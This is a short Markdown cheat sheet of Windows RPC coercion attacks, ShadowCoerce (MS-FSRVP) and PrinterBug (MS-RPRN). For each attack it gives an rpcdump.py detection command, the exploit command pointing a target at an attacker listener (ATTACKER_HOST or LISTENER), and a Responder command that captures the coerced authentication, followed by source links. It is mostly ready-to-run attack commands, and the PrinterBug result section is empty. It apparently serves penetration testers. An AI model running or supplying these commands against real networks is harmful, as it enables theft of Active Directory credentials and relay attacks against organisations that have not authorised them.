# Rpc Abuse

## MS-FSRVP abuse (ShadowCoerce)

### Detection

```bash
rpcdump.py @IP_ADDRESS |grep "FssAgent RPC Server"
```

Result:

```raw
UUID    : A8E0653C-2744-4389-A61D-7373DF8B2292 v1.0 FssAgent RPC Server
```

### Exploit

1:

```bash
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
```

2:

```bash
sudo responder -I ens37 
```

### Sources

- <https://github.com/ShutdownRepo/ShadowCoerce>
- <https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp>

## MS-RPRN abuse (PrinterBug)

### Detection

```bash
rpcdump.py @IP_ADDRESS |grep "spoolsv"
```

Result:

### Exploit

1:

```bash
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER_HOST'
```

2:

```bash
sudo responder -I ens37 
```

### Sources

- <https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn>
